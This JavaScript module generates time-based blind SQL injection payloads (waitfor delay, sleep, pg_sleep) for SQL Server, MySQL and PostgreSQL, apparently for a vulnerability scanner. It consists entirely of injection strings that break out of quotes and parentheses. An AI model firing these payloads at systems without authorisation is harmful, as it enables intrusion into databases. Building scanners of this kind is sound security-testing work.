const sqlScripts = {};
sqlScripts.makeScripts = seconds =>
  [
    /* --- SQL delay test --- */
    [
      `;waitfor delay '0:0:${seconds}'--`,
      `);waitfor delay '0:0:${seconds}'--`,
      `';waitfor delay '0:0:${seconds}'--`,
      `');waitfor delay '0:0:${seconds}'--`,
      `));waitfor delay '0:0:${seconds}'--`,
      `'));waitfor delay '0:0:${seconds}'--`,
    ],

    /* --- mySQL delay test --- */
    [
      `;select sleep(${seconds});--`,
      `);select sleep(${seconds});--`,
      `';select sleep(${seconds});--`,
      `');select sleep(${seconds});--`,
      `));select sleep(${seconds});--`,
      `'));select sleep(${seconds});--`,
    ],

    /* --- PSQL delay test --- */
    [
      `;select pg_sleep(${seconds});--`,
      `);select pg_sleep(${seconds});--`,
      `';select pg_sleep(${seconds});--`,
      `');select pg_sleep(${seconds});--`,
      `));select pg_sleep(${seconds});--`,
      `'));select pg_sleep(${seconds});--`,
    ],
  ];

module.exports = sqlScripts;
